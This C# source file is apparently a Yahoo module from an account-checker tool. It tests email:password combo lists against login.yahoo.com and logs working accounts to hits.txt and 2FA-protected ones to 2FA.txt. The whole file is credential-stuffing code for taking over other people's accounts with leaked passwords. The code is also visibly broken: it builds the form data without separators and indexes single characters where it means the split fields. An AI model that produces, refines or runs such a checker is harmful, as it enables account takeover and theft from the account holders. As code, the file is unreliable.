using HydraAIO.Hydro;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace HydraAIO.Modules
{
    internal class yahoomodule
    {
        public static List<string> proxies;
        public static int proxiesCount = 0;
        public static string proxyProtocol = "";

        public static bool Checkyahoo(string combo)
        {
            
                using (HttpRequest httpRequest = new HttpRequest())
                {

                    string email = combo.Split(':')[0];
                    string password = combo.Split(':')[1];

                    string data = "email=" + email + "password=" + password;

                    CookieContainer cc = new CookieContainer();
                    var request2 = (HttpWebRequest)HttpWebRequest.Create("https://login.yahoo.com/");

                    var postdata = Encoding.ASCII.GetBytes(data);
                    request2.Method = "Post";
                    request2.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                    request2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36";
                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                    httpRequest.AddHeader("bucket", "mbr-phoenix-gpst");
                    httpRequest.Referer = "https://login.yahoo.com/";


                    request2.ContentLength = data.Length;

                    using (var stream = request2.GetRequestStream())
                    {
                        stream.Write(postdata, 0, data.Length);
                    }
                    var response = (HttpWebResponse)request2.GetResponse();

                    string html = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    string api = httpRequest.Post("https://login.yahoo.com", (HttpContent)new BytesContent(Encoding.Default.GetBytes("crumb=czI9ivjtMSr&acrumb=" + "&sessionIndex=QQ--&displayName=" + combo[0] + "&passwordContext=normal&password=" + combo[1] + "&verifyPassword=Next"))).ToString();

                if (api.Contains("Log out"))
                    {
                        ++Program.hits;
                        ++Program.cheked;
                        //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                        Export.AsResult("/hits.txt", combo);
                        return true;
                    }
                    if (api.Contains("Manage account"))
                    {
                        ++Program.hits;
                        ++Program.cheked;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                        return true;
                    }
                    if (api.Contains("https://login.yahoo.com/account/logout"))
                    {
                        ++Program.hits;
                        ++Program.cheked;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                        return true;
                    }
                    if (api.Contains("For your safety, choose a method below to verify that"))
                    {
                        ++Program.custom;
                        ++Program.cheked;
                    //Colorful.Console.WriteLine("[/] 2FA - " + combo, Color.Yellow);
                    Export.AsResult("/2FA.txt", combo);
                        return true;
                    }
                    if (api.Contains("Add a phone number and email"))
                    {
                        ++Program.custom;
                        ++Program.cheked;
                    //Colorful.Console.WriteLine("[/] 2FA - " + combo, Color.Yellow);
                    Export.AsResult("/2FA.txt", combo);
                        return true;
                    }
                    else
                    {
                        ++Program.bad;
                        ++Program.cheked;
                    //Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                    }
                }               
        }
    }
}
